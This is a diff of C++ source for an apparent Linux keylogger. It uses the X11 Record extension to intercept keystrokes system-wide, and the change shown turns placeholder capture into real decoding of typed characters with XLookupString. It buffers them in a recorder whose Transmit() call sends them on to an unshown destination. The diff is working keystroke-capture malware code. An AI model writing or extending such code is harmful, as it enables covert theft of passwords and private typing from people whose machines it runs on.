@@ -1,18 +1,24 @@
 #include "recorder/event_loop.h"
 
-#include <X11/X.h>
-
 #include <atomic>
-#include <cstdio>
+#include <cctype>
 #include <stdexcept>
+
+#include "recorder/recorder.h"
 
 #ifdef __linux__
 
 #include <X11/Xlib.h>
 #include <X11/Xlibint.h>
+#include <X11/Xutil.h>
 #include <X11/extensions/record.h>
 
 static std::atomic_bool exit_event_loop(false);
+
+struct CallbackData {
+  ::Display* ctrl_disp = nullptr;
+  keylogger::Recorder* recorder = nullptr;
+};
 
 /* refer to libxnee */
 union XRecordDatum {
@@ -30,20 +36,48 @@ void KeyCallback(XPointer closure, XRecordInterceptData* hook) {
     return;
   }
 
-  keylogger::Recorder* recorder =
-      reinterpret_cast<keylogger::Recorder*>(closure);
-  (void)recorder;
+  CallbackData* cb_data = reinterpret_cast<CallbackData*>(closure);
   XRecordDatum* data = reinterpret_cast<XRecordDatum*>(hook->data);
 
   int event_type = data->type;
-  BYTE keycode = data->event.u.u.detail;
+  unsigned int key_code = data->event.u.u.detail;
+
+  /* In order to convert the key_code into the corresponding string, we need to
+   * synthesize an artificial XKeyEvent, to feed later to the XLookupString
+   * function. */
+  ::XKeyEvent raw_event = {
+      .type = event_type,
+      .serial = 0,
+      .send_event = False,
+      .display = cb_data->ctrl_disp,
+      .window = data->event.u.focus.window,
+      .root = ::XDefaultRootWindow(cb_data->ctrl_disp),
+      .subwindow = None,
+      .time = data->event.u.keyButtonPointer.time,
+      .x = 1,
+      .y = 1,
+      .x_root = 1,
+      .y_root = 1,
+      .state = data->event.u.keyButtonPointer.state,
+      .keycode = key_code,
+      .same_screen = True,
+  };
+
   const int kEsc = 9;
+  char character = '\0';
+  int len = ::XLookupString(&raw_event, &character, sizeof(character), nullptr,
+                            nullptr);
   switch (event_type) {
     case KeyPress:
-      if (keycode == kEsc) { /* if ESC is pressed at any time, exit */
+      if (key_code == kEsc) { /* if ESC is pressed at any time, exit */
         exit_event_loop = true;
       } else {
-        recorder->BufferKeypress('?');
+        /* casting std::print()'s argument to unsigned char as advised here:
+         * https://en.cppreference.com/w/cpp/string/byte/isprint*/
+        if ((len > 0) && std::isprint(static_cast<unsigned char>(character))) {
+          /* buffer printable characters, discard all others */
+          cb_data->recorder->BufferKeyPress(character);
+        }
       }
       break;
     default:
@@ -83,8 +117,12 @@ void keylogger::RecordKeypressEvents(keylogger::Recorder* recorder) {
     throw std::runtime_error("could not create record context");
   }
 
+  CallbackData cb_data{
+      .ctrl_disp = ctrl_disp,
+      .recorder = recorder,
+  };
   if (!::XRecordEnableContextAsync(data_disp, record_ctx, KeyCallback,
-                                   reinterpret_cast<::XPointer>(recorder))) {
+                                   reinterpret_cast<::XPointer>(&cb_data))) {
     throw std::runtime_error("could not enable record context");
   }
 
@@ -92,7 +130,7 @@ void keylogger::RecordKeypressEvents(keylogger::Recorder* recorder) {
     ::XRecordProcessReplies(data_disp);
   }
 
-  /* flush any remaining characters in the recorder */
+  /* flush any remaining keycodes in the recorder */
   recorder->Transmit();
 
   ::XRecordDisableContext(ctrl_disp, record_ctx);
